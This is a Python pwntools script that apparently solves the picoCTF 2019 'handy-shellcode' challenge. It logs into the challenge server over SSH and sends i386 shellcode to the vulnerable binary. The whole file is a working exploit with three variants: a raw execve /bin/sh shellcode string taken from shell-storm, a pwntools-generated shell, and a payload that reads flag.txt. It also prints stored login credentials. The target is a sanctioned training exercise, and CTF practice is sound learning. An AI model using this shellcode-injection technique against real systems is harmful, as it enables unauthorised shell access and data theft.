from pwn import *
import json

LOCAL = False
PAYLOAD = False
SHELL = True
CAT = True

local_bin = "./vuln"

if(LOCAL):
    p = process(local_bin)
else:
    hostname = "2019shell1.picoctf.com"
    dir = '/problems/handy-shellcode_6_f0b84e12a8162d64291fd16755d233eb'
    with open("/.2019creds.json") as f:
        creds = json.load(f)
        print(creds["user"],creds["pass"])
    s = ssh(host=hostname,user=creds["user"],password=creds["pass"])
    s.set_working_directory(dir)
    p = s.process('sh')
    p.sendline('./vuln')


#Shellcode I got from shellstorm db
if(PAYLOAD):
    payload = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
    print p.recvline().decode()
    p.sendline(payload)
    p.interactive()
    exit()

#Using Shellcraft library from pwntools to start a shell
elif(SHELL):
    payload = asm(shellcraft.i386.linux.sh())
    print p.recvline().decode()
    p.sendline(payload)
    p.interactive()
    exit()

#using shellcraft library from pwntools to just cat the flag
elif(CAT):
    payload = asm(shellcraft.i386.linux.cat('flag.txt'))
    print p.recvline().decode()
    p.sendline(payload)
    print p.recv()
    exit()
